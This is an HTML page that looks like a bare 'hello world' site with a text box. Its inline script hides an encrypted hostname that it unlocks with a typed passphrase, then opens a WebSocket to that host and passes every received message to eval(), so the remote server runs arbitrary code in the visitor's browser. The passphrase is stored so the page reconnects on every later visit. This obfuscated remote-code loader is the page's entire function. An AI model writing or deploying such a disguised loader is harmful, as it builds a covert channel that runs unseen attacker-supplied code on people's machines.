<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui">
    <title>d0b3.github.io</title>
    <style>
      html, body { margin: 0; height: 100%; }
      body {
        display: flex;
        flex-flow: column;
        align-items: center;
        justify-content: center;
        background: #fefbf7;
        color: #a0bcc2;
      }
      textarea {
        width: 480px;
        height: 320px;
      }
    </style>
    <script type="module">

      await new Promise(r => addEventListener('DOMContentLoaded', r, { once: true }));

      async function sha (t) { return new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(t))); };
      async function dec (sock, salt, pass) {
    sock = new Uint8Array(sock.match(/.{2}/g).map(s=>parseInt(s, 16)));
    const flp = await sha(salt+pass+salt);
    for (let i = 0; i < sock.length; i++) sock[i] ^= flp[i%flp.length];
    try {
      const host = new TextDecoder().decode(sock.slice(32)).trim(),
            chk = await sha(host);
      for (let i = 0; i < chk.length; i++) if (chk[i] !== sock[i]) return;
      return 'ws'+host.slice(4)+'/'+[...flp].map(b=>b.toString(16).padStart(2,'0')).join('');
    } catch { }
  };

      const SOCK = ["1f69631de488839710d91f955e3244a6e4cf125ac23518c4abd6a6d2a2a85b37bd69dd4579b5bc5c81d8a8074b931969a473fe753fb9bd4036dace64bc97264bb02a920a2bf1f51288d8b51856874234be62e77339b8a80134c7d921f28c2a05bd69dd4579b5bc","c90353491005899daec19e49a782eac66b9e98bb066ed89614a0f7a1b65140116b03ed118d38fe0223c42e91ee36fb543d397298fbaa6d5098a8c008e4747160244cbf55c476f7023edb3385b56be145243f7499eeeb6f4d8fed8e13e83a7c236b03ed11"];

      const $ta = document.querySelector('textarea');
      try { $ta.value = localStorage.getItem('value') || ''; } catch { };

      $ta.onchange = $ta.onkeyup = async () => {
        const value = $ta.value.trim();
        if (!value) return;
        for (const sock of SOCK) {
          const url = await dec(sock, "whatever", value);
          if (url) {
            $ta.value = 'connecting';
            localStorage.setItem('value', value);
            const socket = new WebSocket(url);
            socket.binaryType = 'arraybuffer';
            socket.onmessage = ev => { eval(new TextDecoder().decode(ev.data))(socket); };
            socket.onerror = () => { $ta.value = 'vodafone m√ºde'; };
            return;
          }
        }
      };

      $ta.onchange();

    </script>
  </head>
  <body>
    <h1>hello world</h1>
    <textarea></textarea>
  </body>
</html>